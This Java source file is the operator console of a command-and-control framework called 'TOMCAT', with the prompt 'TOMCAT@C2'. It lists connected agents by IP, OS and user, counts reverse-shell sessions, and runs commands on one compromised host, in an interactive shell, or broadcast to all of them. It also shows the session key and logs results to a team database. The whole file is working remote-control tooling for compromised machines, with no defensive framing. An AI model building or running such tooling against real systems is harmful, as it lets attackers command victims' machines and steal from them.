package com.tomcat.iface;

import com.tomcat.core.db.TeamDatabase;
import com.tomcat.core.event.EventManager;
import com.tomcat.core.event.EventManager.EventType;
import com.tomcat.core.output.Logger;
import com.tomcat.core.server.ListenerMode;
import com.tomcat.core.server.TomcatServer;
import com.tomcat.core.session.Session;
import com.tomcat.iface.banner.AUTHBanner;
import com.tomcat.iface.banner.CLIBanner;
import com.tomcat.iface.banner.EndBanner;
import com.tomcat.iface.banner.TBanner;
import com.tomcat.utils.AnsiColor;
import com.tomcat.utils.ServerConfig;
import com.tomcat.utils.SystemHelper;
import java.io.*;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.CopyOnWriteArrayList;

public class CLI {

    private final ServerConfig Config;
    private final TeamDatabase Db;
    private TomcatServer Server;
    private Instant ServerStartTime;
    private final List<String> Logs = new CopyOnWriteArrayList<>();
    private final int MaxLogs;
    private volatile boolean Running = true;
    private int CurrentSession = -1;
    private ListenerMode ActiveMode = ListenerMode.MULTI;

    public CLI(ServerConfig Config) {
        this.Config = Config;
        this.MaxLogs = Config.GetMaxLogEntries();
        this.Db = TeamDatabase.Connect(Config);
    }

    private String Box(String Title) {
        int W = 72, Pad = Math.max(0, (W - Title.length()) / 2);
        String T = "  " + AnsiColor.Red + "┌" + "─".repeat(W) + "┐" + AnsiColor.Reset;
        String M =
            "  " +
            AnsiColor.Red +
            "│" +
            " ".repeat(Pad) +
            AnsiColor.White +
            Title +
            " ".repeat(W - Pad - Title.length()) +
            AnsiColor.Red +
            "│" +
            AnsiColor.Reset;
        String B = "  " + AnsiColor.Red + "└" + "─".repeat(W) + "┘" + AnsiColor.Reset;
        return "\n" + T + "\n" + M + "\n" + B;
    }

    private String OutputBox(String Output) {
        int W = 68;
        String Label = "─ Output ";
        String T = "  " + AnsiColor.Green + "┌" + Label + "─".repeat(W - Label.length()) + "┐" + AnsiColor.Reset;
        String Bot = "  " + AnsiColor.Green + "└" + "─".repeat(W) + "┘" + AnsiColor.Reset;
        StringBuilder Sb = new StringBuilder(T + "\n");
        for (String Line : Output.split("\n")) {
            while (Line.length() > W) {
                Sb.append("  ")
                    .append(AnsiColor.Green)
                    .append("│ ")
                    .append(AnsiColor.White)
                    .append(Line, 0, W)
                    .append(AnsiColor.Green)
                    .append(" │")
                    .append(AnsiColor.Reset)
                    .append("\n");
                Line = Line.substring(W);
            }
            int Pad = Math.max(0, W - Line.length());
            Sb.append("  ")
                .append(AnsiColor.Green)
                .append("│ ")
                .append(AnsiColor.White)
                .append(Line)
                .append(" ".repeat(Pad))
                .append(" ")
                .append(AnsiColor.Green)
                .append("│")
                .append(AnsiColor.Reset)
                .append("\n");
        }
        return Sb + Bot;
    }

    private String Divider() {
        return "  " + AnsiColor.Red + "─".repeat(72) + AnsiColor.Reset;
    }

    private void ShowHelp() {
        SystemHelper.ClearScreen();
        TBanner.Logo();
        AUTHBanner.Logo();
        System.out.println(Box("COMMAND REFERENCE"));
        System.out.println();
        CLIBanner.Logo();
    }

    private void ShowSessions() {
        if (Server == null) {
            System.out.println("  ✘ Server not running");
            return;
        }
        List<Session> S = Server.GetSessions().GetAll();
        System.out.println(Box("ACTIVE SESSIONS"));
        System.out.println();
        if (S.isEmpty()) {
            System.out.println("  ⚠ No active sessions");
            return;
        }
        System.out.printf(
            "  %s%-5s %-14s %-14s %-16s %-10s %-10s%s%n",
            AnsiColor.Red,
            "ID",
            "TYPE",
            "AGENT",
            "IP",
            "OS",
            "USER",
            AnsiColor.Reset
        );
        System.out.println(Divider());
        for (Session Sess : S) {
            System.out.printf(
                "  %s#%-4d %-14s %-14s %-16s %-10s %-10s%s%n",
                AnsiColor.White,
                Sess.GetId(),
                Sess.GetSessionType().name(),
                Sess.GetAgentName(),
                Sess.GetAgentIp(),
                Sess.GetOs(),
                Sess.GetUser(),
                AnsiColor.Reset
            );
        }
        System.out.println();
    }

    private void ShowStatus() {
        if (Server == null || !Server.IsRunning()) {
            System.out.println("  ✘ Server not running");
            return;
        }
        long Up = ServerStartTime != null ? Duration.between(ServerStartTime, Instant.now()).getSeconds() : 0;
        System.out.println(Box("SERVER STATUS"));
        System.out.println();
        System.out.printf("  %sStatus    %s● ONLINE%n", AnsiColor.Red, AnsiColor.Green);
        System.out.printf("  %sMode      %s%s%n", AnsiColor.Red, AnsiColor.White, ActiveMode.name());
        System.out.printf("  %sUptime    %s%s%n", AnsiColor.Red, AnsiColor.White, SystemHelper.FormatUptime(Up));
        System.out.printf("  %sSessions  %s%d%n", AnsiColor.Red, AnsiColor.White, Server.GetSessions().Count());
        System.out.printf(
            "  %sKey       %s%s%n",
            AnsiColor.Red,
            AnsiColor.White,
            Server.GetCrypto().GetKeyAsBase64Url()
        );
        System.out.printf(
            "  %sDB        %s%s (%s)%n",
            AnsiColor.Red,
            AnsiColor.White,
            Db.IsConnected() ? "Connected" : "Memory",
            Config.GetDbType()
        );
        System.out.println();
    }

    private void ShowStats() {
        if (Server == null) {
            System.out.println("  ✘ Server not running");
            return;
        }
        Map<String, Integer> Stats = Server.GetSessions().GetStats();
        System.out.println(Box("SESSION STATISTICS"));
        System.out.println();
        System.out.printf(
            "  %sServer     %s%s:%d%n",
            AnsiColor.Red,
            AnsiColor.White,
            Server.GetHost(),
            Server.GetPort()
        );
        System.out.printf("  %sTotal      %s%d%n", AnsiColor.Red, AnsiColor.White, Stats.get("Total"));
        System.out.printf("  %sTOMCAT     %s%d%n", AnsiColor.Red, AnsiColor.White, Stats.get("TOMCAT"));
        System.out.printf("  %sRaw Shell  %s%d%n", AnsiColor.Red, AnsiColor.White, Stats.get("REVERSE_SHELL"));
        System.out.println();
    }

    private void ShowLogs() {
        System.out.println(Box("RECENT LOGS"));
        System.out.println();
        if (Logs.isEmpty()) {
            System.out.println("  ⚠ No logs");
            return;
        }
        int Start = Math.max(0, Logs.size() - 20);
        for (int I = Start; I < Logs.size(); I++) System.out.println(Logs.get(I));
        System.out.println();
    }

    private void DoExec(int SessionId, String Command) {
        if (Server == null) {
            System.out.println("  ✘ Server not running");
            return;
        }
        String[] Result = Server.ExecuteCommand(SessionId, Command);
        boolean Ok = Boolean.parseBoolean(Result[0]);
        if (Ok) {
            System.out.println(OutputBox(Result[1]));
            AddLog(AnsiColor.Green + "◀ SESSION-" + SessionId + " OK" + AnsiColor.Reset, false);
        } else {
            System.out.println("  ✘ " + Result[1]);
            AddLog(AnsiColor.Red + "✘ SESSION-" + SessionId + " FAIL: " + Result[1] + AnsiColor.Reset, false);
        }
        Db.SaveCommandLog(SessionId, "operator", Command, Result[1], Ok);
    }

    private void DoBroadcast(List<Integer> Ids, String Command) {
        if (Server == null) {
            System.out.println("  ✘ Server not running");
            return;
        }
        System.out.printf("  ⟳ Broadcasting to %d session(s): %s%n", Ids.size(), Command);
        Map<Integer, String[]> Results = Server.BroadcastCommand(Ids, Command);
        System.out.println(Box("BROADCAST RESULTS — " + Results.size() + " sessions"));
        System.out.println();
        for (Map.Entry<Integer, String[]> En : Results.entrySet()) {
            boolean Ok = Boolean.parseBoolean(En.getValue()[0]);
            System.out.printf(
                "  %sSESSION-%-3d %s%s%n",
                Ok ? AnsiColor.Green : AnsiColor.Red,
                En.getKey(),
                Ok ? "✔ " : "✘ ",
                AnsiColor.Reset
            );
            System.out.println(OutputBox(En.getValue()[1]));
            Db.SaveCommandLog(En.getKey(), "operator", Command, En.getValue()[1], Ok);
        }
    }

    private void DoBroadcastAll(String Command) {
        if (Server == null) {
            System.out.println("  ✘ Server not running");
            return;
        }
        int Total = Server.GetSessions().Count();
        if (Total == 0) {
            System.out.println("  ⚠ No active sessions");
            return;
        }
        System.out.printf("  ⟳ Broadcasting to all %d session(s): %s%n", Total, Command);
        Map<Integer, String[]> Results = Server.BroadcastAll(Command);
        System.out.println(Box("BROADCAST-ALL RESULTS — " + Results.size() + " sessions"));
        System.out.println();
        for (Map.Entry<Integer, String[]> En : Results.entrySet()) {
            boolean Ok = Boolean.parseBoolean(En.getValue()[0]);
            System.out.printf(
                "  %sSESSION-%-3d %s%s%n",
                Ok ? AnsiColor.Green : AnsiColor.Red,
                En.getKey(),
                Ok ? "✔ " : "✘ ",
                AnsiColor.Reset
            );
            System.out.println(OutputBox(En.getValue()[1]));
            Db.SaveCommandLog(En.getKey(), "operator", Command, En.getValue()[1], Ok);
        }
    }

    private void InteractiveSession(int SessionId) {
        Optional<Session> Opt = Server.GetSessions().Get(SessionId);
        if (Opt.isEmpty()) {
            System.out.println("  ✘ Session not found");
            return;
        }
        Session S = Opt.get();
        SystemHelper.ClearScreen();
        TBanner.Logo();
        System.out.println(Box("INTERACTIVE SESSION"));
        System.out.printf(
            "%n  %sSESSION-%d%s  [%s]%n",
            AnsiColor.Red,
            SessionId,
            AnsiColor.Reset,
            S.GetSessionType().name()
        );
        System.out.printf("  Agent: %s (%s)%n  IP: %s%n%n", S.GetAgentName(), S.GetOs(), S.GetAgentIp());
        System.out.println("  → Type 'back' to return to main console");
        AddLog(AnsiColor.Red + "↳ Entered SESSION-" + SessionId + AnsiColor.Reset, false);
        BufferedReader Reader = new BufferedReader(new InputStreamReader(System.in));
        CurrentSession = SessionId;
        while (CurrentSession == SessionId) {
            try {
                System.out.printf(
                    "%n%s(%sSESSION-%d%s)%s ≫ %s",
                    AnsiColor.Red,
                    AnsiColor.White,
                    SessionId,
                    AnsiColor.Red,
                    AnsiColor.White,
                    AnsiColor.Reset
                );
                String Cmd = Reader.readLine();
                if (Cmd == null || Cmd.trim().isEmpty()) continue;
                Cmd = Cmd.trim();
                if (Cmd.equalsIgnoreCase("back")) {
                    CurrentSession = -1;
                    System.out.printf("  %s◀ Returned to main console%s%n", AnsiColor.Red, AnsiColor.Reset);
                    break;
                }
                if (Cmd.equalsIgnoreCase("clear")) {
                    SystemHelper.ClearScreen();
                    TBanner.Logo();
                    continue;
                }
                AddLog(AnsiColor.Red + "▶ SESSION-" + SessionId + ": " + Cmd + AnsiColor.Reset, false);
                DoExec(SessionId, Cmd);
            } catch (IOException E) {
                break;
            }
        }
    }

    private void KillSession(int SessionId) {
        Optional<Session> Opt = Server.GetSessions().Get(SessionId);
        if (Opt.isEmpty()) {
            System.out.println("  ✘ Session not found");
            return;
        }
        String Name = Opt.get().GetAgentName();
        Server.RemoveSession(SessionId);
        System.out.printf("  ✔ SESSION-%d (%s) terminated%n", SessionId, Name);
        AddLog(AnsiColor.Green + "✔ SESSION-" + SessionId + " killed" + AnsiColor.Reset, false);
    }

    private void ServerEventHandler(EventType Type, Map<String, Object> Data) {
        switch (Type) {
            case ServerStarted -> AddLog(
                AnsiColor.White +
                "✔ Server listening on " +
                Data.get("Host") +
                ":" +
                Data.get("Port") +
                AnsiColor.Reset,
                true
            );
            case AgentConnected -> AddLog(
                AnsiColor.Green +
                "★ [" +
                Data.get("Type") +
                "] SESSION-" +
                Data.get("ID") +
                ": " +
                Data.get("AgentName") +
                " (" +
                Data.get("OS") +
                ")" +
                AnsiColor.Reset,
                true
            );
            case AgentDisconnected -> AddLog(
                AnsiColor.Red +
                "✖ SESSION-" +
                Data.get("ID") +
                " disconnected: " +
                Data.get("Reason") +
                AnsiColor.Reset,
                true
            );
            case AgentRemoved -> AddLog(
                AnsiColor.White + "⊘ SESSION-" + Data.get("ID") + " removed" + AnsiColor.Reset,
                false
            );
            case Error -> AddLog(AnsiColor.Red + "✘ Error: " + Data.get("Message") + AnsiColor.Reset, true);
        }
    }

    private boolean StartServer(String Host, int Port, ListenerMode Mode) {
        Server = new TomcatServer(Host, Port, Mode, Config);
        Server.AddEventListener(this::ServerEventHandler);
        boolean[] Result = Server.StartServer();
        if (!Result[0]) {
            AddLog(AnsiColor.Red + "✘ Failed to start server" + AnsiColor.Reset, true);
            return false;
        }
        ServerStartTime = Instant.now();
        Thread T = new Thread(Server::AcceptConnections, "AcceptConnections");
        T.setDaemon(true);
        T.start();
        return true;
    }

    private void AddLog(String Msg, boolean PrintNow) {
        String Ts = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
        String Entry = "  " + AnsiColor.Red + "[" + Ts + "]" + AnsiColor.Reset + " " + Msg;
        Logs.add(Entry);
        if (Logs.size() > MaxLogs) Logs.remove(0);
        if (PrintNow) System.out.println(Entry);
    }

    private void RunLoop() {
        ShowHelp();
        BufferedReader Reader = new BufferedReader(new InputStreamReader(System.in));
        int LastCount = Logs.size();
        while (Running) {
            try {
                int Cur = Logs.size();
                if (Cur > LastCount) {
                    System.out.printf(
                        "  %s● %d new events — type 'logs' to view%s%n",
                        AnsiColor.White,
                        Cur - LastCount,
                        AnsiColor.Reset
                    );
                    LastCount = Cur;
                }
                System.out.printf(
                    "%n%s┌──(%sTOMCAT@C2%s)%n%s└─%s≫ %s",
                    AnsiColor.Red,
                    AnsiColor.White,
                    AnsiColor.Red,
                    AnsiColor.Red,
                    AnsiColor.White,
                    AnsiColor.Reset
                );
                String Input = Reader.readLine();
                if (Input == null || Input.trim().isEmpty()) continue;
                String[] Parts = Input.trim().split("\\s+", 3);
                String Cmd = Parts[0].toLowerCase();
                switch (Cmd) {
                    case "exit", "quit" -> {
                        System.out.printf("  %s⏻ Shutting down%s%n", AnsiColor.White, AnsiColor.Reset);
                        if (Server != null) Server.StopServer();
                        Db.Close();
                        Running = false;
                    }
                    case "help" -> ShowHelp();
                    case "clear" -> {
                        SystemHelper.ClearScreen();
                        TBanner.Logo();
                        LastCount = Logs.size();
                    }
                    case "sessions", "agents" -> ShowSessions();
                    case "status" -> ShowStatus();
                    case "stats" -> ShowStats();
                    case "logs" -> {
                        ShowLogs();
                        LastCount = Logs.size();
                    }
                    case "use" -> {
                        if (Parts.length < 2) {
                            System.out.println("  ⚠ Usage: use <id>");
                            continue;
                        }
                        try {
                            InteractiveSession(Integer.parseInt(Parts[1]));
                            LastCount = Logs.size();
                        } catch (NumberFormatException E) {
                            System.out.println("  ✘ Invalid session ID");
                        }
                    }
                    case "exec" -> {
                        if (Parts.length < 3) {
                            System.out.println("  ⚠ Usage: exec <id> <command>");
                            continue;
                        }
                        try {
                            DoExec(Integer.parseInt(Parts[1]), Parts[2]);
                        } catch (NumberFormatException E) {
                            System.out.println("  ✘ Invalid session ID");
                        }
                    }
                    case "broadcast" -> {
                        if (Parts.length < 3) {
                            System.out.println("  ⚠ Usage: broadcast <id,id,...> <command>");
                            System.out.println("  ⚠       broadcast all <command>");
                            continue;
                        }
                        String IdsOrAll = Parts[1].toLowerCase();
                        String BCmd = Parts[2];
                        if (IdsOrAll.equals("all")) {
                            DoBroadcastAll(BCmd);
                        } else {
                            List<Integer> Ids = new ArrayList<>();
                            for (String S : IdsOrAll.split(",")) {
                                try {
                                    Ids.add(Integer.parseInt(S.trim()));
                                } catch (NumberFormatException Ignored) {}
                            }
                            if (Ids.isEmpty()) System.out.println("  ✘ No valid session IDs");
                            else DoBroadcast(Ids, BCmd);
                        }
                    }
                    case "kill" -> {
                        if (Parts.length < 2) {
                            System.out.println("  ⚠ Usage: kill <id>");
                            continue;
                        }
                        try {
                            KillSession(Integer.parseInt(Parts[1]));
                        } catch (NumberFormatException E) {
                            System.out.println("  ✘ Invalid session ID");
                        }
                    }
                    default -> {
                        System.out.printf("  %s✘ Unknown command: %s%s%n", AnsiColor.Red, Cmd, AnsiColor.Reset);
                        System.out.println("  → Type 'help' for available commands");
                    }
                }
            } catch (IOException E) {
                break;
            }
        }
        EndBanner.EndLogo();
    }

    public void Run(String Host, int Port, ListenerMode Mode) {
        this.ActiveMode = Mode;
        if (!StartServer(Host, Port, Mode)) return;
        try {
            Thread.sleep(500);
        } catch (InterruptedException Ignored) {}
        RunLoop();
    }
}
